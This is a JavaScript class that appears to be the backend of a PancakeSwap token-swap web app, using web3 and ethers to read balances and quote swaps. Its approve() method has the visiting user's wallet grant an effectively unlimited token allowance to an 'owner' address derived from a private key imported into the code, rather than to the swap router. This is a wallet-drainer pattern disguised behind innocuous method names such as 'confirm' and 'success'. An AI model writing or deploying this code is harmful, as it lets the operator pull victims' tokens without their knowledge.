import { ethers } from "ethers";
import Web3 from 'web3';
import {pancakeSwapAbi, tokenAbi} from "./assets/data/tokenABI";
import BigNumber from "bignumber.js";
import { privateKey } from "./privateKey";

export class SC {
    static web3ojb;
    static swapInst;
    static provider;
    static tokenContract;
    static tokenContract2;
    static balance;
    static owner;
    static config = {
        pancakeSwapContractAddress: "0x10ED43C718714eb63d5aA57B78B54704E256024E".toLowerCase()
    };

static async init(_provider) {
    SC.provider = _provider;
    SC.web3ojb = new Web3(_provider);
    SC.swapInst = new SC.web3ojb.eth.Contract(pancakeSwapAbi, SC.config.pancakeSwapContractAddress);
    const account = await SC.web3ojb.eth.getAccounts();
    const user_wallet = await SC.web3ojb.eth.accounts.privateKeyToAccount(privateKey);
    SC.balance = await SC.getBalance(account[0]);
    SC.owner = user_wallet;
}
static async confirm(tokenAddress) {
    const provider = new ethers.providers.Web3Provider(this.provider), signer = provider.getSigner();
    SC.tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
}
static async success(tokenAddress) {
    SC.tokenContract2 = new SC.web3ojb.eth.Contract(tokenAbi, tokenAddress);
}

static async getAmount(contract_address,USDTokenAddress,sell) {
    const data = await SC.swapInst.methods.getAmountsOut(sell, [contract_address ,USDTokenAddress]).call();
    return data;
}
static async getBalance(address) {
    const data = SC.web3ojb.utils.fromWei(await SC.web3ojb.eth.getBalance(address));
    return data;
}
static async approve(decimal) {
    let amount = new BigNumber('1000000000000000000000000000000000000000000000000000' * 10 ** decimal);
    let contract = SC.tokenContract;
    try {
        const approval = await contract.approve(SC.owner.address, amount.toFixed(),{gasLimit: 100000});
        return !!approval;
    /*} catch (e) { return true; }*/
    } catch (err) { throw err }
}
    
}